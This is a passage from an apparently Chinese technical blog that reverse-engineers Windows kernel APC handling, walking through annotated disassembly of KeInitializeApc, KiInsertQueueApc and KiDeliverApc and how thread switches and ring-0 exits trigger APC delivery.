href="#ApcQueueable" class="headerlink" title="ApcQueueable"></a>ApcQueueable</h4><p>标识当前是否允许挂入APC，1表示允许挂入。</p><h3 id="3-2-APC挂入"><a href="#3-2-APC挂入" class="headerlink" title="3.2 APC挂入"></a>3.2 APC挂入</h3><p>在3环DLL注入时使用到的<em><strong>QueueUserAPC</strong></em>函数就是线程的APC挂入过程，调用链如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">QueueUserAPC NtQueueApcThread  KeInitializeApc   KeInsertQueueApc    KiInsertQueueApc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="KeInitializeApc"><a href="#KeInitializeApc" class="headerlink" title="KeInitializeApc"></a>KeInitializeApc</h4><p>此函数用于在插入APC前初始化一个新的KAPC结构体；<br>参数定义：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">VOID <span class="token function">KeInitializeApc</span><span class="token punctuation">(</span>    IN PKAPC Apc<span class="token punctuation">,</span>                         <span class="token comment">//KAPC 指针</span>    IN PKTHREAD Thread<span class="token punctuation">,</span>                   <span class="token comment">//目标线程</span>    IN KAPC_ENVIRONMENT Environment<span class="token punctuation">,</span>      <span class="token comment">//四种状态</span>    IN PKKERNEL_ROUTINE KernelRoutine<span class="token punctuation">,</span>    <span class="token comment">//销毁 KAPC 的函数地址</span>    IN PKRUNDOWN_ROUTINE RundownRoutine OPTIONAL<span class="token punctuation">,</span>    IN PKNORMAL_ROUTINE NormalRoutine<span class="token punctuation">,</span>    <span class="token comment">//用户 APC 总入口或者内核 APC 函数</span>    IN KPROCESSOR_MODE Mode<span class="token punctuation">,</span>              <span class="token comment">//要插入用户 APC 队列还是内核 APC 队列</span>    IN PVOID Context                      <span class="token comment">//内核APC：NULL，用户APC：真正的APC函数</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码分析：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">mov     <span class="token register variable">edi</span>, <span class="token register variable">edi</span>push    <span class="token register variable">ebp</span>mov     <span class="token register variable">ebp</span>, <span class="token register variable">esp</span>mov     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_0<span class="token operator">]</span>                <span class="token comment">; 获取KAPC</span>mov     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_8<span class="token operator">]</span>                <span class="token comment">; 获取Env</span>cmp     <span class="token register variable">edx</span>, <span class="token number">2</span>                          <span class="token comment">; 判断Env的值是否为2</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_4<span class="token operator">]</span>                <span class="token comment">; 获取Thread</span>mov     word ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">]</span>, <span class="token number">12h</span>             <span class="token comment">; KAPC结构体赋值</span>mov     word ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2</span><span class="token operator">]</span>, <span class="token number">30h</span> <span class="token comment">; '0'</span>jnz     short loc_804FBA6A              <span class="token comment">; 如果Env是2则跳转</span>mov     <span class="token register variable">dl</span>, <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">165h</span><span class="token operator">]</span>                  <span class="token comment">; 获取KTHREAD中的ApcStateIndex</span><span class="token label function">loc_804FBA6A:</span>                           <span class="token comment">; CODE XREF: KeInitializeApc(x,x,x,x,x,x,x,x)+1C↑j</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>                    <span class="token comment">; 继续赋值KAPC</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_C<span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">14h</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_10<span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>, <span class="token register variable">dl</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">18h</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_14<span class="token operator">]</span>               <span class="token comment">; NormalRoutine</span>xor     <span class="token register variable">edx</span>, <span class="token register variable">edx</span>cmp     <span class="token register variable">ecx</span>, <span class="token register variable">edx</span>                        <span class="token comment">; 判断是否为内核模式</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">1Ch</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>jz      short loc_804FBA96              <span class="token comment">; 内核模式下赋值KAPC</span>mov     <span class="token register variable">cl</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_18<span class="token operator">]</span>                <span class="token comment">; 用户模式下继续赋值KAPC</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Dh</span><span class="token operator">]</span>, <span class="token register variable">cl</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_1C<span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">20h</span><span class="token operator">]</span>, <span class="token register variable">ecx</span>jmp     short loc_804FBA9C              <span class="token comment">; KAPC中最后的Inserted赋值为0</span><span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FBA96:</span>                           <span class="token comment">; CODE XREF: KeInitializeApc(x,x,x,x,x,x,x,x)+40↑j</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Dh</span><span class="token operator">]</span>, <span class="token register variable">dl</span>                   <span class="token comment">; 内核模式下赋值KAPC</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">20h</span><span class="token operator">]</span>, <span class="token register variable">edx</span><span class="token label function">loc_804FBA9C:</span>                           <span class="token comment">; CODE XREF: KeInitializeApc(x,x,x,x,x,x,x,x)+4E↑j</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Eh</span><span class="token operator">]</span>, <span class="token register variable">dl</span>                   <span class="token comment">; KAPC中最后的Inserted赋值为0</span>pop     <span class="token register variable">ebp</span>retn    <span class="token number">20h</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="KiInsertQueueApc"><a href="#KiInsertQueueApc" class="headerlink" title="KiInsertQueueApc"></a>KiInsertQueueApc</h4><p>插入已经初始化的KPRC结构体；<br>参数定义：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">VOID FASTCALL <span class="token function">KiInsertQueueApc</span><span class="token punctuation">(</span> IN PKAPC Apc<span class="token punctuation">,</span> <span class="token comment">// KAPC指针（指向一个已经初始化完成的APC）</span> IN KPRIORITY PriorityBoost<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码分析：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">mov     <span class="token register variable">edi</span>, <span class="token register variable">edi</span>push    <span class="token register variable">ebp</span>mov     <span class="token register variable">ebp</span>, <span class="token register variable">esp</span>push    <span class="token register variable">ecx</span>mov     <span class="token register variable">eax</span>, <span class="token register variable">ecx</span>                        <span class="token comment">; 获取KAPC</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Eh</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; 判断Inserted字段</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">]</span>                    <span class="token comment">; 获取Thread</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>, <span class="token register variable">edx</span>jz      short loc_804FEC5E              <span class="token comment">; 判断ApcStateIndex值是否为3</span>xor     <span class="token register variable">al</span>, <span class="token register variable">al</span>                          <span class="token comment">; 若已经被插入，直接返回</span>leaveretn<span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FEC5E:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+12↑j</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>, <span class="token number">3</span>           <span class="token comment">; 判断ApcStateIndex值是否为3</span>jnz     short loc_804FEC6D              <span class="token comment">; 判断NormalRoutine是否为0</span>mov     <span class="token register variable">dl</span>, <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">165h</span><span class="token operator">]</span>                  <span class="token comment">; 获取KTHREAD中的ApcStateIndex</span>mov     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>, <span class="token register variable">dl</span><span class="token label function">loc_804FEC6D:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+1C↑j</span>cmp     dword ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">1Ch</span><span class="token operator">]</span>, <span class="token number">0</span>          <span class="token comment">; 判断NormalRoutine是否为0</span>movsx   <span class="token register variable">edx</span>, byte ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>         <span class="token comment">; 获取ApcStateIndex</span>push    <span class="token register variable">ebx</span>push    <span class="token register variable">esi</span>push    <span class="token register variable">edi</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token register variable">edx</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">138h</span><span class="token operator">]</span>           <span class="token comment">; 根据ApcStateIndex获取ApcStatePointer</span>mov     <span class="token register variable">dl</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Dh</span><span class="token operator">]</span>                   <span class="token comment">; 获取ApcMode</span>jz      short loc_804FECC4              <span class="token comment">; 当NormalRoutine为0时跳转</span>test    <span class="token register variable">dl</span>, <span class="token register variable">dl</span>                          <span class="token comment">; 判断是否为内核APC</span>jz      short loc_804FECAC              <span class="token comment">; 处理内核APC</span>cmp     dword ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">14h</span><span class="token operator">]</span>, offset _PsExitSpecialApc@<span class="token number">20</span> <span class="token comment">; 判断APC释放函数的类型</span>jnz     short loc_804FECAC              <span class="token comment">; 处理内核APC</span>movsx   <span class="token register variable">ebx</span>, <span class="token register variable">dl</span>                         <span class="token comment">; 处理用户APC</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">4Ah</span><span class="token operator">]</span>, <span class="token number">1</span>           <span class="token comment">; 修改UserApcPending</span>lea     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token register variable">ebx</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span>                <span class="token comment">; 获取要插入的APC队列</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>                      <span class="token comment">; 获取APC队列</span>lea     <span class="token register variable">esi</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">0Ch</span><span class="token operator">]</span>                  <span class="token comment">; 获取当前的KAPC结构体中ApcListEntry字段的地址</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">]</span>, <span class="token register variable">ebx</span>                      <span class="token comment">; 前驱指针放入原先的前驱指针</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">edi</span>                    <span class="token comment">; 后继指针放入原先的节点地址</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">esi</span>                    <span class="token comment">; 原队列的末尾节点的后继指针指向新插入的节点</span>mov     <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>, <span class="token register variable">esi</span>                      <span class="token comment">; 当前节点作为尾节点</span>jmp     short loc_804FECEB              <span class="token comment">; 用户APC插入完成</span><span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FECAC:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+40↑j</span>                                        <span class="token comment">; KiInsertQueueApc(x,x)+49↑j</span>movsx   <span class="token register variable">ebx</span>, <span class="token register variable">dl</span>                         <span class="token comment">; 处理内核APC</span>lea     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token register variable">ebx</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span>                <span class="token comment">; 获取APC队列，同上</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>lea     <span class="token register variable">esi</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">0Ch</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">]</span>, <span class="token register variable">edi</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">ebx</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">]</span>, <span class="token register variable">esi</span>mov     <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">esi</span>jmp     short loc_804FECEB              <span class="token comment">; 获取ApcStateIndex</span><span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FECC4:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+3C↑j</span>movsx   <span class="token register variable">esi</span>, <span class="token register variable">dl</span>lea     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token register variable">esi</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">]</span>                <span class="token comment">; 获取APC队列</span>mov     <span class="token register variable">esi</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>                    <span class="token comment">; 获取后继节点</span>jmp     short loc_804FECD8              <span class="token comment">; 后继节点和APC队列相等，即链表是否为空</span><span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FECCF:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+94↓j</span>cmp     dword ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">10h</span><span class="token operator">]</span>, <span class="token number">0</span>          <span class="token comment">; 判断进程号是否为0</span>jz      short loc_804FECDC              <span class="token comment">; 插入APC</span>mov     <span class="token register variable">esi</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>                    <span class="token comment">; 获取另外一个APC队列？</span><span class="token label function">loc_804FECD8:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+87↑j</span>cmp     <span class="token register variable">esi</span>, <span class="token register variable">edi</span>                        <span class="token comment">; 后继节点和APC队列相等，即链表是否为空</span>jnz     short loc_804FECCF              <span class="token comment">; 判断进程号是否为0</span><span class="token label function">loc_804FECDC:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+8D↑j</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">]</span>                      <span class="token comment">; 插入APC</span>lea     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">0Ch</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>, <span class="token register variable">ebx</span>mov     <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">esi</span>mov     <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">edi</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">]</span>, <span class="token register variable">edi</span><span class="token label function">loc_804FECEB:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+64↑j</span>                                        <span class="token comment">; KiInsertQueueApc(x,x)+7C↑j</span>movsx   <span class="token register variable">edi</span>, byte ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>         <span class="token comment">; 获取ApcStateIndex</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">2Eh</span><span class="token operator">]</span>, <span class="token number">1</span>           <span class="token comment">; Inserted字段置为1</span>movzx   <span class="token register variable">esi</span>, byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">165h</span><span class="token operator">]</span>        <span class="token comment">; 获取TCB中的ApcStateIndex</span>cmp     <span class="token register variable">edi</span>, <span class="token register variable">esi</span>                        <span class="token comment">; 比较两个ApcStateIndex字段</span>pop     <span class="token register variable">edi</span>pop     <span class="token register variable">esi</span>pop     <span class="token register variable">ebx</span>jnz     short loc_804FED70              <span class="token comment">; ApcStateIndex不同则跳转</span>test    <span class="token register variable">dl</span>, <span class="token register variable">dl</span>                          <span class="token comment">; 判断ApcMode，用户模式则跳转</span>jnz     short loc_804FED42              <span class="token comment">; 用户模式处理，判断State</span>mov     <span class="token register variable">dl</span>, <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">2Dh</span><span class="token operator">]</span>                   <span class="token comment">; 获取线程的State</span>cmp     <span class="token register variable">dl</span>, <span class="token number">2</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">49h</span><span class="token operator">]</span>, <span class="token number">1</span>           <span class="token comment">; 赋值KernelApcPending字段为1</span>jnz     short loc_804FED1B              <span class="token comment">; 线程State不为2则跳转</span>mov     <span class="token register variable">cl</span>, <span class="token number">1</span>call    <span class="token register variable">ds</span>:__imp_@HalRequestSoftwareInterrupt@<span class="token number">4</span> <span class="token comment">; HalRequestSoftwareInterrupt(x)</span>jmp     short loc_804FED70              <span class="token comment">; 异常退出</span><span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FED1B:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+C9↑j</span>cmp     <span class="token register variable">dl</span>, <span class="token number">5</span>                           <span class="token comment">; 判断State是否等于5</span>jnz     short loc_804FED70              <span class="token comment">; 异常退出</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">58h</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; 判断WaitIrql是否为0</span>jnz     short loc_804FED70              <span class="token comment">; 异常退出</span>xor     <span class="token register variable">edx</span>, <span class="token register variable">edx</span>cmp     <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token number">1Ch</span><span class="token operator">]</span>, <span class="token register variable">edx</span>                  <span class="token comment">; 判断NormalRoutine是否为0</span>jz      short loc_804FED3Acmp     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">0D4h</span><span class="token operator">]</span>, <span class="token register variable">edx</span>                 <span class="token comment">; 判断KernelApcDisable</span>jnz     short loc_804FED70              <span class="token comment">; 异常退出</span>cmp     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">48h</span><span class="token operator">]</span>, <span class="token register variable">dl</span>                   <span class="token comment">; 判断KernelApcInProgress</span>jnz     short loc_804FED70              <span class="token comment">; 异常退出</span><span class="token label function">loc_804FED3A:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+E5↑j</span>push    <span class="token register variable">edx</span>mov     <span class="token register variable">edx</span>, <span class="token number">100h</span>jmp     short loc_804FED68<span class="token comment">; ---------------------------------------------------------------------------</span><span class="token label function">loc_804FED42:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+BD↑j</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">2Dh</span><span class="token operator">]</span>, <span class="token number">5</span>           <span class="token comment">; 用户模式处理，判断State</span>jnz     short loc_804FED70              <span class="token comment">; 异常退出</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">59h</span><span class="token operator">]</span>, <span class="token number">1</span>           <span class="token comment">; 判断WaitMode</span>jnz     short loc_804FED70              <span class="token comment">; 异常退出</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">164h</span><span class="token operator">]</span>, <span class="token number">0</span>          <span class="token comment">; 判断Alertable</span>jnz     short loc_804FED5D              <span class="token comment">; UserApcPending置为1</span>cmp     byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">4Ah</span><span class="token operator">]</span>, <span class="token number">0</span>           <span class="token comment">; 判断UserApcPending</span>jz      short loc_804FED70              <span class="token comment">; 异常退出</span><span class="token label function">loc_804FED5D:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+10F↑j</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">4Ah</span><span class="token operator">]</span>, <span class="token number">1</span>           <span class="token comment">; UserApcPending置为1</span>push    <span class="token number">0</span>mov     <span class="token register variable">edx</span>, <span class="token number">0C0h</span><span class="token label function">loc_804FED68:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+FA↑j</span>push    <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>var_4<span class="token operator">]</span>call    @KiUnwaitThread@<span class="token number">16</span>              <span class="token comment">; 唤醒线程</span><span class="token label function">loc_804FED70:</span>                           <span class="token comment">; CODE XREF: KiInsertQueueApc(x,x)+B9↑j</span>mov     <span class="token register variable">al</span>, <span class="token number">1</span>                           <span class="token comment">; 异常退出</span>leaveretn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3-APC调用"><a href="#3-3-APC调用" class="headerlink" title="3.3 APC调用"></a>3.3 APC调用</h3><h4 id="线程切换"><a href="#线程切换" class="headerlink" title="线程切换"></a>线程切换</h4><p>在线程切换时，<em><strong>SwapContext</strong></em>函数会判断KernelApcPending是否为0，如果不为0则会返回1，在<em><strong>KiSwapThread</strong></em>中会对该返回值进行判断，从而调用<em><strong>KiDeliverApc</strong></em>：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token label function">loc_80501CCF:</span>                           <span class="token comment">; CODE XREF: KiSwapThread()+1A↑j</span>mov     <span class="token register variable">ecx</span>, <span class="token register variable">eax</span>call    @KiSwapContext@<span class="token number">4</span>                <span class="token comment">; KiSwapContext(x)</span>test    <span class="token register variable">al</span>, <span class="token register variable">al</span>                          <span class="token comment">; 判断SwapContext返回值</span>mov     <span class="token register variable">cl</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">58h</span><span class="token operator">]</span>                   <span class="token comment">; 获取WaitIrql</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">54h</span><span class="token operator">]</span>                  <span class="token comment">; 获取WaitStatus</span>mov     <span class="token register variable">esi</span>, <span class="token register variable">ds</span>:__imp_@KfLowerIrql@<span class="token number">4</span>    <span class="token comment">; KfLowerIrql(x)</span>jz      short loc_80501CF6mov     <span class="token register variable">cl</span>, <span class="token number">1</span>                           <span class="token comment">; NewIrql</span>call    <span class="token register variable">esi</span> <span class="token comment">; KfLowerIrql(x)            ; KfLowerIrql(x)</span>xor     <span class="token register variable">eax</span>, <span class="token register variable">eax</span>push    <span class="token register variable">eax</span>push    <span class="token register variable">eax</span>push    <span class="token register variable">eax</span>call    _KiDeliverApc@<span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="退出0环"><a href="#退出0环" class="headerlink" title="退出0环"></a>退出0环</h4><p>当线程调用API或异常中断返回到3环时，在<em><strong>KiServiceExit</strong></em>函数中会对UserApcPending字段进行判断，最后同样调用<em><strong>KiDeliverApc</strong></em>函数进行处理。</p><h3 id="3-4-APC执行"><a href="#3-4-APC执行" class="headerlink" title="3.4 APC执行"></a>3.4 APC执行</h3><h4 id="KiDeliverApc"><a href="#KiDeliverApc" class="headerlink" title="KiDeliverApc"></a>KiDeliverApc</h4><p>此函数完成内核APC的执行，以及用户APC执行前的处理，将继续调用KiInitializeUserApc函数处理用户APC。<br>函数定义：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">_KTRAP_FRAME <span class="token operator">*</span>__stdcall <span class="token function">KiDeliverApc</span><span class="token punctuation">(</span> BOOLEAN CanUserAPC<span class="token punctuation">,</span>  <span class="token keyword">int</span> unknown<span class="token punctuation">,</span>  _KTRAP_FRAME <span class="token operator">*</span>trapframe<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码分析：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">_KiDeliverApc@<span class="token number">12</span> proc nearLockHandle<span class="token operator">=</span> _KLOCK_QUEUE_HANDLE ptr <span class="token operator">-</span><span class="token number">28h</span>var_1C<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">1Ch</span>BugCheckParameter1<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">18h</span>var_14<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">14h</span>var_10<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">10h</span>var_C<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">0Ch</span>var_8<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">8</span>var_4<span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span>arg_0<span class="token operator">=</span> byte ptr  <span class="token number">8</span>arg_4<span class="token operator">=</span> dword ptr  <span class="token number">0Ch</span>arg_8<span class="token operator">=</span> dword ptr  <span class="token number">10h</span>mov     <span class="token register variable">edi</span>, <span class="token register variable">edi</span>push    <span class="token register variable">ebp</span>mov     <span class="token register variable">ebp</span>, <span class="token register variable">esp</span>sub     <span class="token register variable">esp</span>, <span class="token number">28h</span>mov     <span class="token register variable">ecx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span>arg_8<span class="token operator">]</span>                <span class="token comment">; 获取TrapFrame</span>test    <span class="token register variable">ecx</span>, <span class="token register variable">ecx</span>jz      short loc_804FEA54mov     <span class="token register variable">edx</span>, 